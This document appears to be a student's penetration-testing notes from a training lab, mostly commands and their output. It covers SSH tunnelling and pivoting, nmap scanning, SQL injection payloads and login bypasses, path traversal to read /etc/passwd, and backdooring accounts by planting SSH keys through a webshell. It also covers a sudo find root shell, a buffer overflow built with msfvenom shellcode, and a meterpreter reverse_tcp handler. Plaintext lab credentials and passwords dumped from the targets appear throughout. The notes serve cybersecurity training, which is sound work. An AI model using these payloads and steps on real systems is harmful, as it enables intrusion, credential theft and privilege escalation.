http://10.50.20.250:8000/          TYFI-006-M  Ja7Gh0bmQhGeAWq
10.50.28.181  Semper
GREYHOST:     10.50.35.7                                                                           student     Ja7Gh0bmQhGeAWq
ACCESSING GREYHOST:
  ssh -X student@10.50.35.7                                                                        Ja7Gh0bmQhGeAWq
  ssh -MS /tmp/grey student@10.50.35.7                                                             Ja7Gh0bmQhGeAWq

#CREDENTIALS
  WINDOWS:    xfreerdp /u:student /v:10.50.42.187 -dynamic-resolution +glyph-cache +clipboard      password
  LINUX:      ssh -X student@10.50.29.84                                                           Charity@2006
  GREYHOST:                                                                                   Student     Long Pass
  
REBUILD BOXES:
  VTA
  INSTANCES
  REBUILD INSTANCE
  SELECT IMAGE: NIX_OPS
  PARTITIION: AUTOMATIC
  REBUILD INSTANCE
  
wiremask.eu Used to calculate offset for buffer overflows
GTFOBINS Used to find exploitable su commands on Linux


#NMAP SCRIPT COMMANDS
  /usr/share/nmap/scripts
  nmap --script <filename>|<category>|<directory>
  nmap --script-help "ftp-* and discovery"
  nmap --script-args <args>
  nmap --script-args-file <filename>
  nmap --script-help <filename>|<category>|<directory>
  nmap --script-trace
      http-enum.nse


#COMMANDS
  ssh -MS /tmp/grey student@10.50.35.7
  ssh -S /tmp/grey grey -O forward -D 9050
  for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
  proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.1,2,3,97,98,99,100,105,111,120,129,130,131 -p-
  ssh -S /tmp/grey grey -O forward -L 40700:192.168.28.111:80
  ssh -S /tmp/grey grey -O forward -L 40710:192.168.28.111:22                                                  #Sets a new master socket referencing the original master socket to access an additional box
  ssh -MS /tmp/billybobhost billybob@0.0.0.0 -p 40710
  ssh -S /tmp/billybobhost -O forward -D 9050
  ssh -S /tmp/grey grey -O cancel -L 40700:192.168.28.111:80                                                   #Closes out a tunnel
  proxychains nmap -v -sT -Pn -T4 --script http-enum.nse 192.168.28.111 -p 80
  



ssh-keygen -t rsa -b 4096                                                                                        #Generates public ssh key
; mkdir /var/www/.ssh
; ls /var/www/ssh
vim test.txt
cat id_rsa.pub            ##HIGHLIGHT ALL OF IT##
copy to test.txt and addd > /var/www/.ssh/authorized_keys to the end
; echo (cat test.txt and copy over file contents) in quotes
ssh -i id_rsa www-data@10.50.27.157




#SQL INJECTION
  ##COMMANDS
SELECT                    Extracts data from a database
UNION                     Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS
USE                       Selects the DB to use
UPDATE                    Updates data in a database
DELETE                    Deletes data from a database
INSERT INTO               Inserts new data into a database
CREATE DATABASE           Creates a new database
ALTER DATABASE            Modifies a database
CREATE TABLE              Creates a new table
ALTER TABLE               Modifies a table
DROP TABLE                Deletes a table
CREATE INDEX              Creates an index (search key)
DROP INDEX                Deletes an index

show databases;           shows databases
SELECT * FROM session.car shows all items within the car subtable of the session table
SELECT * FROM session.car UNION SELECT tireid,name,size,cost,1,2 FROM session.Tires;

shwo TABLES FROM information_schema
Select Table_schema,table_name,Column_name FROM information_schema.Column;
IMPORTANT:
  TABLES
  COLUMNS
  DATABASES/TABLE_SCHEMA

User = ' GySgt' or 1='1'
Pass = 'Pass' or 1='1'

php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'                               GOLDEN STATEMENT
Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
Audi' UNION select 1,2,3 #
Audi' UNION select id,2,name,pass,5 FROM session.user #
http://10.50.38.117/uniondemo.php?Selection=2%20or%201=1;%20#
http://10.50.38.117/uniondemo.php?Selection=2%20 UNION select 1,2,3;#
http://10.50.38.117/uniondemo.php?Selection=2%20 UNION select table_schema,column_name,table_name FROM information_schema.columns;#
http://10.50.38.117/uniondemo.php?Selection=2%20%20UNION select type,color,name FROM session.car;#

http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20select%20last_name,password,email%20FROM%20sqlinjection.members;#
RAM' UNION select table_schema,column_name FROM information_schema.columns; #

UNION @@version
RAM' UNION select 1,@@version; #       GIVES SQL VERSION

http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20SELECT%20Table_schema,column_name,Table_name%20FROM%20information_schema.columns;%20#
http://0.0.0.0:40756/cases/productsCategory.php?category=1%20UNION%20SELECT%201,comment,data%20FROM%20sqlinjection.share4%20WHERE%20id=1337;%20#

./func <<<$(./Desktop/Security/Linux/mybuff.py)        runs func and injects mybuff as the input

./func "YahWeh"                   Command Line Argument
Enter a string: 
./func <<<$(echo "YahWeh")        User Input
Enter a string: 


env - gdb ./func                  Starts gdb without environment variables
unset LINES(OR COLUMNS)           removes gdb environmental variables
gdb ./func
info functions
pdisass main

find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4    Searches starting after the heap to the end of the stack for a jump instruction pointing to the EIP

#PAYLOADS
  msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python




Privilege Escalation
	Order of Operations
		sudo -l			Checks current user privileges
		id				Displays user and group ID's associated with logged in account
		uname -a			Shows hostname, OS version, Architecture
		ss -natu | netstat -natu	Shows network connections
		ls -la /etc/sudoers		Shows permissions for /etc/sudoers file

/tmp						Both of these are temporary directories
/dev/shm					

How To Figure Out Init Type
	Commands
		ls -latr /proc/1/exe
		stat /sbin/init
		man init
		init --version
		ps 1

audit.log					Kernel Log for SystemV
	ausearch -p 22
	ausearch -m USER_LOGIN -sv no
	ausearch -ua edwards -ts yesterday -te now -i

journal ctl					Kernel Log for SystemD
	journalctl _TRANSPORT=audit
	journalctl _TRANSPORT=audit | grep 603
	
Logs To Monitor
	auth.log/secure				Logins/authentications
	lastlog					Each users' last successful login time
	btmp						Bad login attempts
	sulog						Usage of SU command
	utmp						Currently logged in users (W command)
	wtmp						Permanent record on user on/off
	
Log Handling Order of Operations
	file /var/log/wtmp
	find /var/log -type f -mmin -10 2> /dev/null
	journalctl -f -u ssh
	journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
	
Commands
	stat						Shows file timestamps
	

rsyslog.conf

find / -type f -perm /2000 -ls 2>/dev/null
find / -type f -perm /4000 -ls 2>/dev/null
find / -type f -perm /6000 -ls 2>/dev/null



Dry Run Notes
* = COMMANDS RUN

SOCKETS:
	ssh -MS /tmp/gray user2@10.50.47.187
	ssh -S /tmp/t2 t2 -O forward -D 9050
	ssh -S /tmp/t2 t2 -O forward -L 13000:192.168.28.181:80
	ssh -S /tmp/t2 t2 -O forward -L 40000:192.168.28.172:22
	ssh -S /tmp/t2 t2 -O forward -L 41000:192.168.28.181:22
	ssh -MS /tmp/t3 Aaron@0.0.0.0 -p 40000

http://0.0.0.0:30100/pick.php?product=7 UNION SELECT table_schema,column_name,3 FROM information_schema.columns #




target IP = 10.50.47.187
if subnet then ping/nmap
else nmap scan
	*nmap -v -sT -Pn -T4 10.50.47.187
	 	22/tcp open  ssh
		80/tcp open  http
	*nmap -v -sT -Pn -T4 -sV --script=http-enum.nse 10.50.47.187 -p 80 OR *nikto -h 10.50.47.187
		80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
		| http-enum: 
		|   /login.php: Possible admin folder
		|   /login.html: Possible admin folder
		|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
		|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
		|_http-server-header: Apache/2.4.29 (Ubuntu)
GO TO PAGE
	OPEN ALL LINKS AND INTERACT WITH THE STUFF ON THE PAGES
		*executive assistant page text box:
			../../../../../../etc/passwd
				root:x:0:0:root:/root:/bin/bash
				daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
				bin:x:2:2:bin:/bin:/usr/sbin/nologin
				sys:x:3:3:sys:/dev:/usr/sbin/nologin
				sync:x:4:65534:sync:/bin:/bin/sync
				games:x:5:60:games:/usr/games:/usr/sbin/nologin
				man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
				lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
				mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
				news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
				uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
				proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
				www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
				backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
				list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
				irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
				gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
				nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
				systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
				systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
				syslog:x:102:106::/home/syslog:/usr/sbin/nologin
				messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
				_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
				lxd:x:105:65534::/var/lib/lxd/:/bin/false
				uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
				dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
				landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
				sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
				pollinate:x:110:1::/var/cache/pollinate:/bin/false
				ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
				mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
				user2:x:1001:1001::/home/user2:/bin/sh
			../../../../../../etc/hosts
				fe00::0 ip6-localnet
				ff00::0 ip6-mcastprefix
				ff02::1 ip6-allnodes
				ff02::2 ip6-allrouters
				ff02::3 ip6-allhosts
				192.168.28.181 WebApp
		*Employee Login Page
			Tom' or 1='1
				Use F12>Network to capture the Post and append it after the .php?
Array
(
    [0] => user2
    [name] => user2
    [1] => RntyrfVfNER78
    [pass] => RntyrfVfNER78			EaglesIsARE78
)
1Array
(
    [0] => user3
    [name] => user3
    [1] => Obo4GURRnccyrf
    [pass] => Obo4GURRnccyrf			Bob4THEEapples
)
1Array
(
    [0] => Lee_Roth
    [name] => Lee_Roth
    [1] => anotherpassword4THEages
    [pass] => anotherpassword4THEages
)
1

	*ON BOX:
		cat /etc/hosts
		whoami
		cat /etc/crontab
		for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
			64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=3.40 ms
			64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=2.29 ms
			64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.883 ms (IGNORE)
	
	nmap -v -sT -Pn -T4 -sV 192.168.28.172,181
		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
		
		Nmap scan report for 192.168.28.181
		Host is up (0.0016s latency).
		Not shown: 998 closed ports
		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
		80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
		
	run nikto/http-enum scans agains 181
		browse to page
			http://0.0.0.0:30100/pick.php?product=1 or 1=1 ; DO THIS TO ALL PAGES
				PAGE 7 IS THE VULNERABLE PAGE http://0.0.0.0:30100/pick.php?product=7 or 1=1 ;
			ENUMERATE THE SQL PAGE:
				http://0.0.0.0:30100/pick.php?product=7 UNION select 1,2,3;
				http://0.0.0.0:30100/pick.php?product=7 UNION select 1,3,2;
		GOLDEN STATEMENT: http://0.0.0.0:30100/pick.php?product=7 UNION select table_schema,column_name,table_name from information_schema.columns ;
				http://0.0.0.0:30100/pick.php?product=7 UNION select user_id,username,name from siteusers.users ;
		GIVES NEW USER INFOS:
			Lroth	anotherpassword4THEages
			Aaron	ncnffjbeqlCn$$jbeq		apasswordyPa$$word
		
		USE FOUND CREDENTIALS TO ATTEMPT TO ACCESS .172 AND .181
	ssh Aaron@0.0.0.0 -p 41000 > gives shell to .181
			sudo -l (find command allowed)
				sudo find . -exec /bin/sh \; -quit (opens a privileged shell allowing to access root directories)
				open bash shell
					for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
						64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.038 ms
						64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=3.45 ms
						64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=1.16 ms
		
		FROM LINOPS:
			proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.179
				|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.179:22-<><>-OK
				|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.179:135-<><>-OK
				|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.179:139-<><>-OK
				|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.179:445-<><>-OK
				|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.179:3389-<><>-OK
				|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.179:9999-<><>-OK
				
			xfreerdp /u:Lroth /p:anotherpassword4THEages /dynamic-resolution +clipboard /v:127.0.0.1:45000
				change port on secureserverBuffo.py to prep windows box

				netstat -ano for PID for SecureServer
				tasklist /svc | findstr /i "secure"
				
			msfvenom
				use exploit/multi/handler
				set payload windows/meterpreter/reverse_tcp
				set lhost 0.0.0.0
				./secureserverBuffo.py
				run multi/handler
				
			
			
FOR LINUX BUFFER OVERFLOW
	./func
	get EIP from gdb
	restart gdb and unset env variables
	run
	take first location after heap and last location in stack: find /b 0x...., 0x...., 0xff, 0xe4
		PICK TOP 4 AND ADD TO mybuff script
		NOP sled
		OUTPUT OF msfvenom -p linux/x86/exec CMD=whoami -b "\x00" -f python OTHER THAN EMPTY TOP LINE
		
FOR WEBSHELL
	upload /home/student/Downloads/webshell.php
		CHECK FOR ACCESS TO /uploads
		access file if possible
	ssh-keygen -t rsa -b 4096
		do not set a password
		cat id_rsa.pub
			copy whole key
			cat /etc/passwd on target
				key will be put in target home directory
					mkdir .ssh in target home directory
						ls -a .ssh directory just created
					echo "whole key"> /.../.../.ssh/authorized_keys
						PUTS KEY IN FILE ALLOWING ACCESS
	ssh user@IP to test key (use -i id_rsa.pub filepath if necessary)
	
	
SQL INJECTION
	use F12>Network to capture the POST request, copy the POST request into the browser after .php? to exploit login
	Item' or 1='1;	should cause a table overflow
	Item' UNION select 1,2,3,4 #	TO FIGURE OUT NUMBER OF COLUMNS
	Item' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns #	
	Item' UNION select color,2,name,carid,type from session.car #
	Item' UNION select 1,2,@@version,4,5 #
	
	
	.php?Selection=# OR 1=1 #
	.php?Selection=# UNION select 1,2,3 #
	.php?Selection=# UNION select 1,3,2 #
	.php?Selection=# UNION select table_shema,column_name,table_name from information_schema.columns #
	.php?Selection=# UNION select 1,2,@@version #
